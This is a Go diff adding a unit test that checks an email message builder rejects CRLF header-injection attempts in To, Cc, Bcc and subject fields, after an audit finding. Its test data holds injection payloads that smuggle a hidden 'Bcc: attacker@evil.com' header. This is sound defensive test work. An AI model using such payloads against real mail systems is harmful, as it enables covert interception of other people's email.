@@ -85,3 +85,36 @@ func TestBuildMessageHTML(t *testing.T) {
 		t.Error("html format should set text/html content type")
 	}
 }
+
+// TestBuildMessageRejectsHeaderInjection guards the audit case: To/Cc/Bcc were
+// joined raw into headers, so an address carrying CR/LF could inject arbitrary
+// header lines (e.g. a hidden Bcc) into every recipient's copy. buildMessage
+// must reject such addresses (and subjects) with an error naming the offender.
+func TestBuildMessageRejectsHeaderInjection(t *testing.T) {
+	bad := []string{
+		"a@x.com\r\nBcc: attacker@evil.com",
+		"a@x.com\nBcc: attacker@evil.com",
+		"a@x.com\rBcc: attacker@evil.com",
+		"a@x.com\x00",
+		"bad local@x.com", // space in the local part (no display-name form)
+	}
+	for _, addr := range bad {
+		if _, err := buildMessage("from@x.com", []string{addr}, nil, nil, "S", "b", "text", nil); err == nil {
+			t.Errorf("To %q should be rejected", addr)
+		}
+		if _, err := buildMessage("from@x.com", nil, []string{addr}, nil, "S", "b", "text", nil); err == nil {
+			t.Errorf("Cc %q should be rejected", addr)
+		}
+		if _, err := buildMessage("from@x.com", nil, nil, []string{addr}, "S", "b", "text", nil); err == nil {
+			t.Errorf("Bcc %q should be rejected", addr)
+		}
+	}
+	// The subject is emitted as a raw header line — CRLF injects there too.
+	if _, err := buildMessage("from@x.com", []string{"a@x.com"}, nil, nil, "Hi\r\nBcc: attacker@evil.com", "b", "text", nil); err == nil {
+		t.Error("CRLF in subject should be rejected")
+	}
+	// Legitimate display-name addresses must keep working.
+	if _, err := buildMessage("Zhang San <from@x.com>", []string{"Li Si <to@x.com>"}, nil, nil, "S", "b", "text", nil); err != nil {
+		t.Errorf("display-name address wrongly rejected: %v", err)
+	}
+}
